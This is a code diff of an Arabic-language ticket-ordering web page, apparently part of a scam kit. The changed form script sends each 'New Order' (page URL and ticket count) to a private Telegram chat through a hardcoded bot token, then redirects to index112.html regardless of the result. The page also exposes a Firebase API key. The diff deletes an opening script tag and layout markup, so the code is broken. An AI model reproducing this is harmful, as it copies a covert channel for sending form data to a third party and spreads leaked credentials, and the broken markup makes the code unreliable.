@@ -350,65 +350,48 @@
                                     <button type="submit" class="btn btn-20 bg-green w-100">أضف معلوماتي </button>
                                 </form>
                             </div>
-                            <script>
-                                document.getElementById('myForm').addEventListener('submit', function(event) {
-                    event.preventDefault(); // منع إعادة تحميل الصفحة
-            
-                    var pageTitle = document.title;  // الحصول على عنوان الصفحة
-                    var pageUrl = window.location.href;  // الحصول على رابط الصفحة
-                    var ticketCount = document.getElementById("ticketCount").value; // الحصول على عدد التذاكر المختارة
+                          <script>
+    document.getElementById('myForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // منع إعادة تحميل الصفحة
 
-                    // إعداد الرسالة
-                    var message = `         ====== 🚚 New Order ========:
-                                  - المستخدم قام بزيارة الفعالية رقم "2": 
-                    
-                                  -  الرابط : ${pageUrl}
-                                            
-                                  - عدد التذاكر المختارة : ${ticketCount}`;
-                    
-                    // معلومات بوت Telegram
-                    var telegramToken = '7789845398:AAEHKJDnUFpcG6bn_6lgCqZuygOyxaA-ElY'; // استبدل بـ API Token الخاص بالبوت
-                    var telegramChatId = '-1002324684325'; // استبدل بمعرف الدردشة الخاص بك
-            
-                    // إرسال الرسالة إلى Telegram باستخدام API
-                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: telegramChatId,
-                            text: message
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if(data.ok) {
-                            // تحويل المستخدم إلى صفحة أخرى بعد نجاح الإرسال
-                            window.location.href = "index112.html"; // استبدل 'index112.html' بالصفحة التي تريد التوجيه إليها
-                        } else {
-                            alert("حدث خطأ أثناء إرسال المعلومات.");
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert("حدث خطأ أثناء إرسال المعلومات.");
-                    });
-                });
-                            </script>
-                            <div class="col-12 col-md-6 pt-3 pt-md-0">
-                                <a href="index.html">
-                                    <button type="button" class="btn btn-20 bg-light w-100" onClick="window.location.pathname('/info')">الرجوع الي الخلف</button>
-                                </a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+        var pageTitle = document.title; // الحصول على عنوان الصفحة
+        var pageUrl = window.location.href; // الحصول على رابط الصفحة
+        var ticketCount = document.getElementById("ticketCount").value; // الحصول على عدد التذاكر المختارة
 
-    <script>
+        // إعداد الرسالة
+        var message = `
+            ====== 🚚 New Order ========:
+            - المستخدم قام بزيارة الفعالية رقم "1": 
+            - الرابط : ${pageUrl}
+            - عدد التذاكر المختارة : ${ticketCount}
+        `;
+
+        // معلومات بوت Telegram
+        var telegramToken = '7789845398:AAEHKJDnUFpcG6bn_6lgCqZuygOyxaA-ElY'; // استبدل بـ API Token الخاص بالبوت
+        var telegramChatId = '-1002324684325'; // استبدل بمعرف الدردشة الخاص بك
+
+        // إرسال الرسالة إلى Telegram باستخدام API
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            })
+        })
+        .then(response => {
+            // تحويل المستخدم إلى صفحة أخرى بعد الإرسال (بغض النظر عن النجاح أو الفشل)
+            window.location.href = 'index112.html';
+        })
+        .catch(error => {
+            // التحويل إلى الصفحة حتى لو حدث خطأ
+            window.location.href = 'index112.html';
+        });
+    });
+</script>
+
         // تهيئة Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyCiXyYBXp3yz2P1ToiN1S6gBeYnu2ONZ3M",
